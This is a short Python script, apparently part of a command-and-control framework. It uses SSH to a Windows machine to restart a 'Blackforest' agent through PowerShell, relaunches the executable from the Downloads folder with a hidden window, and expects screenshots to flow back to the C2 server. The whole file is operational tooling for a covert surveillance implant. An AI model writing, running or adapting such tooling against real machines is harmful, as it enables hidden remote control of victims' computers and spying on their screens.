#!/usr/bin/env python3
"""
Alternative: Send restart command via C2 server's shell handler
Uses existing connection instead of creating new one
"""
import subprocess
import time

# PowerShell commands to restart agent
restart_cmd = """Stop-Process -Name Blackforest -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 2; Start-Process "$env:USERPROFILE\\Downloads\\Blackforest.exe" -WindowStyle Hidden; Get-Process Blackforest -ErrorAction SilentlyContinue | Select-Object -First 1
"""

print("[*] Sending restart command to Windows agent...")
print(f"[*] Command: {restart_cmd.strip()}")

# Use SSH to send command (since they have SSH access)
cmd = [
    'ssh',
    'Avengers@192.168.0.6',
    f'powershell.exe -Command "{restart_cmd}"'
]

try:
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
    print(f"\n[+] Command sent!")
    print(f"[*] Output: {result.stdout}")
    if result.stderr:
        print(f"[!] Errors: {result.stderr}")
    
    print("\n[+] Agent should restart in 2-3 seconds...")
    print("[+] Watch for new '[*] Blackforest Agent Started' in logs!")
    print("[+] Screenshots should appear in c2/screenshot_*.jpg")
    
except Exception as e:
    print(f"\n[-] Error: {e}")
    print("[!] Try manually: ssh Avengers@192.168.0.6")
    print("[!] Then run: " + restart_cmd)
